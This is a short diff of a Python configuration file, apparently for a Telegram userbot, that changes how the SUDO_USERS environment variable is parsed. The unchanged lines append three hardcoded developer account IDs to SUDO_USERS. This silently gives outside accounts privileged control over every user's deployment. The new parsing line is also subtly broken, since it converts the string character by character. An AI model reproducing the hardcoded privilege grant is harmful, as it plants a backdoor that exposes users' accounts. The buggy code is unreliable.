@@ -33,7 +33,7 @@ SESSION15 = os.getenv("SESSION15", None)
 HNDLR = os.getenv("HNDLR", "!")
 GROUP_MODE = os.getenv("GROUP_MODE", "True")
 
-SUDO_USERS = set(int(x) for x in os.environ.get("SUDO_USERS", "").split())
+SUDO_USERS = list(map(int, os.getenv("SUDO_USERS", "")))
 DEVS = [1517994352, 1789859817, 1432756163]
 for x in DEVS:
     SUDO_USERS.append(x)
